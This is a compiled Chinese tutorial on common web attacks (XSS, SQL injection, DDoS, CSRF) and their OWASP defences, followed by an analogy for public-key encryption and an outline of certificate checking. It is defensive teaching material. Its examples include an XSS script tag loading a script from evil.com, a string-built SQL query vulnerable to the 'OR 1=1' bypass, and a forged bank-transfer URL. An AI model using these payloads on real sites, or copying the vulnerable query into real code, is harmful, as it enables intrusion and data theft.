> 作者：编译青春
> 
> https://zhuanlan.zhihu.com/p/23309154



## 1\. Cross Site Script（XSS， 跨站脚本攻击)

首先插播一句，为毛叫 XSS，缩写明显是 CSS 啊？没错，为了防止与我们熟悉的 CSS（Cascading Style Sheets）混淆，所以干脆更名为 XSS。

那 XSS 是什么呢？一言蔽之，XSS 就是攻击者在 Web 页面中插入恶意脚本，当用户浏览页面时，促使脚本执行，从而达到攻击目的。XSS 的特点就是想尽一切办法在目标网站上执行第三方脚本。
![image](http://upload-images.jianshu.io/upload_images/13148580-27ae9964fb2a1a99.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

举个例子。原有的网站有个将数据库中的数据显示到页面的上功能，document.write("data from server")。但如果服务器没有验证数据类型，直接接受任何数据时，攻击者可以会将 <script src='http:bad-script.js'></scirpt> 当做一个数据写入数据库。当其他用户请求这个数据时，网站原有的脚本就会执行 document.write("<script src='[http://www.evil.com/bad-script.js](https://link.zhihu.com/?target=http%3A//www.evil.com/bad-script.js)'></scirpt>")，这样，便会执行 bad-script.js。如果攻击者在这段第三方的脚本中写入恶意脚本，那么普通用户便会受到攻击。

XSS 主要有三种类型：

*   存储型 XSS： 注入的脚本永久的存在于目标服务器上，每当受害者向服务器请求此数据时就会重新唤醒攻击脚本；
*   反射型 XSS： 当用受害者被引诱点击一个恶意链接，提交一个伪造的表单，恶意代码便会和正常返回数据一起作为响应发送到受害者的浏览器，从而骗过了浏览器，使之误以为恶意脚本来自于可信的服务器，以至于让恶意脚本得以执行。
*   DOM 型 XSS： 有点类似于存储型 XSS，但存储型 XSS 是将恶意脚本作为数据存储在服务器中，每个调用数据的用户都会受到攻击。但 DOM 型 XSS 则是一个本地的行为，更多是本地更新 DOM 时导致了恶意脚本执行。

那么如何防御 XSS 攻击呢？
*   从客户端和服务器端双重验证所有的输入数据，这一般能阻挡大部分注入的脚本
*   对所有的数据进行适当的编码
*   设置 HTTP Header： "X-XSS-Protection: 1"

## 2\. SQL Injection （SQL 注入）
所谓 SQL 注入，就是通过客户端的输入把 SQL 命令注入到一个应用的数据库中，从而得以执行恶意 SQL 语句。

先看个例子。
``` 
uname = request.POST['username']
password = request.POST['password']

sql = "SELECT all FROM users WHERE username='" + uname + "' AND password='" + password + "'"

database.execute(sql)
```
上面这段程序直接将客户端传过来的数据写入到数据库。试想一下，如果用户传入的 password 值是： "password’ OR 1=1"，那么 sql 语句便会变成：

```
sql = "SELECT all FROM users WHERE username='username' AND password='password' OR 1=1"
```

那么，这句 sql 无论 username 和 password 是什么都会执行，从而将所有用户的信息取出来。

那么怎么预防 sql 的问题呢？

想要提出解决方案，先看看 sql 注入得以施行的因素：
*   网页应用使用 SQL 来控制数据库
*   用户传入的数据直接被写入数据库

根据 [OWASP](https://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/OWASP)，下面看看具体的预防措施。

*   Prepared Statements (with Parameterized Queries)： 参数化的查询语句可以强制应用开发者首先定义所有的 sql 代码，之后再将每个参数传递给查询语句
*   Stored Procedures： 使用语言自带的存储程序，而不是自己直接操纵数据库
*   White List Input Validation： 验证用户的输入
*   Escaping All User Supplied Input： 对用户提供的所有的输入都进行编码

## 3\. Distributed Denial of Service （DDoS， 分布式拒绝服务）

DoS 攻击就是通过大量恶意流量占用带宽和计算资源以达到瘫痪对方网络的目的。

举个简单的例子，老郑家面馆生意红火，突然有一天一群小混混进了点，霸占了座位，只闲聊不点菜，结果坐在店里的人不吃面，想吃面的人进不来，导致老郑无法向正常客户服务。

而 DDoS 攻击就是将多个计算机联合起来一同向目标发起攻击，从而成倍地提高拒绝服务攻击的威力。

![image](http://upload-images.jianshu.io/upload_images/13148580-30413cb6a6044f4f.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

一般 DDoS 攻击有两个目的：
*   敲诈勒索，逼你花钱买平安
*   打击竞争对手

在技术角度上，DDoS攻击可以针对网络通讯协议的各层，手段大致有：TCP类的SYN Flood、ACK Flood，UDP类的Fraggle、Trinoo，DNS Query Flood，ICMP Flood，Slowloris类、各种社工方式等等，这些技术这里不做详细解释。但是一般会根据攻击目标的情况，针对性的把技术手法混合，以达到最低的成本最难防御的目的，并且可以进行合理的节奏控制，以及隐藏保护攻击资源。

阿里巴巴的安全团队在实战中发现，DDoS 防御产品的核心是检测技术和清洗技术。检测技术就是检测网站是否正在遭受 DDoS 攻击，而清洗技术就是清洗掉异常流量。而检测技术的核心在于对业务深刻的理解，才能快速精确判断出是否真的发生了 DDoS 攻击。清洗技术对检测来讲，不同的业务场景下要求的粒度不一样。

## 4\. Cross Site Request Forgery (CSRF， 跨站请求伪造)

简单来说，CSRF 就是网站 A 对用户建立信任关系后，在网站 B 上利用这种信任关系，跨站点向网站 A 发起一些伪造的用户操作请求，以达到攻击的目的。

举个例子。网站 A 是一家银行的网站，一个转账接口是 "[http://www.bankA.com/transfer?toID=12345678&cash=1000](https://link.zhihu.com/?target=http%3A//www.bankA.com/transfer%3FtoID%3D12345678%26cash%3D1000)"。toID 表示转账的目标账户，cash 表示转账数目。当然这个接口没法随便调用，只有在已经验证的情况下才能够被调用。

此时，攻击者建立了一个 B 网站，里面放了一段隐藏的代码，用来调用转账的接口。当受害者先成功登录了 A 网站，短时间内不需要再次验证，这个时候又访问了网站 B，B 里面隐藏的恶意代码就能够成功执行。

那怎么预防 CSRF 攻击呢？[OWASP](https://link.zhihu.com/?target=https%3A//en.wikipedia.org/wiki/OWASP) 推荐了两种检查方式来作为防御手段。

*   检查标准头部，确认请求是否同源： 检查 source origin 和 target origin，然后比较两个值是否匹配
*   检查 CSRF Token： 主要有四种推荐的方式
    *   Synchronizer Tokens： 在表单里隐藏一个随机变化的 token，每当用户提交表单时，将这个 token 提交到后台进行验证，如果验证通过则可以继续执行操作。这种情况有效的主要原因是网站 B 拿不到网站 A 表单里的 token;
    *   Double Cookie Defense： 当向服务器发出请求时，生成一个随机值，将这个随机值既放在 cookie 中，也放在请求的参数中，服务器同时验证这两个值是否匹配；
    *   Encrypted Token Pattern： 对 token 进行加密
    *   Custom Header： 使用自定义请求头部，这个方式依赖于同源策略。其中最适合的自定义头部便是： "X-Requested-With: XMLHttpRequest"

## 非对称加密 私钥和公钥
> 作者: ThreatHunter
>
> https://www.zhihu.com/question/33645891/answer/192604856

举一个小学生都能懂的例子吧：-----------------------------
看一个小时候经常在《趣味数学》这类书里的一个数学小魔术：让对方任意想一个3位数，并把这个数和91相乘，然后告诉我积的最后三位数，我就可以猜出对方想的是什么数字啦！

比如对方想的是123，那么对方就计算出123 * 91等于11193，并把结果的末三位193告诉我。看起来，这么做似乎损失了不少信息，让我没法反推出原来的数。不过，我仍然有办法：只需要把对方告诉我的结果再乘以11，乘积的末三位就是对方刚开始想的数了。可以验证一下，193 * 11 = 2123，末三位正是对方所想的秘密数字！

其实道理很简单，91乘以11等于1001，而任何一个三位数乘以1001后，末三位显然都不变（例如123乘以1001就等于123123）。知道原理后，我们可以构造一个定义域和值域更大的加密解密系统。比方说，任意一个数乘以400000001后，末8位都不变，而400000001 = 19801 * 20201，于是你来乘以19801，我来乘以20201，又一个加密解密不对称的系统就构造好了。

甚至可以构造得更大一些：4000000000000000000000000000001 = 1199481995446957 * 3334772856269093，这样我们就成功构造了一个30位的加密系统。这是一件非常coooooooool的事情，任何人都可以按照我公布的方法加密一个数，但是只有我才知道怎么把所得的密文变回去。其安全性就建立在算乘积非常容易，但是要把4000000000000000000000000000001分解成后面两个数相乘，在没有计算机的时代几乎不可能成功！但如果仅仅按照上面的思路，如果对方知道原理，知道我要构造出带很多0的数，根据19801和8位算法这2个条件非常容易穷举出400000001这个目标值。

要解决这个问题，真实世界就不是使用乘法了，比如RSA算法使用的是指数和取模运算，但本质上就是上面这套思想。

但是公钥有可能伪造, 这时候就需要证书. 客户端在接受到服务端发来的SSL证书时，会对证书的真伪进行校验，以浏览器为例说明如下：![[图片上传中...(image-441a4a-1534673207924)]
](http://upload-images.jianshu.io/upload_images/13148580-f89d0080cc76dbe6.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

（1）首先浏览器读取证书中的证书所有者、有效期等信息进行一一校验
（2）浏览器开始查找操作系统中已内置的受信任的证书发布机构CA，与服务器发来的证书中的颁发者CA比对，用于校验证书是否为合法机构颁发
（3）如果找不到，浏览器就会报错，说明服务器发来的证书是不可信任的。
（4）如果找到，那么浏览器就会从操作系统中取出 颁发者CA 的公钥，然后对服务器发来的证书里面的签名进行解密
（5）浏览器使用相同的hash算法计算出服务器发来的证书的hash值，将这个计算的hash值与证书中签名做对比
（6）对比结果一致，则证明服务器发来的证书合法，没有被冒充
（7）此时浏览器就可以读取证书中的公钥，用于后续加密了

![image](http://upload-images.jianshu.io/upload_images/13148580-83396b634089d76f.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
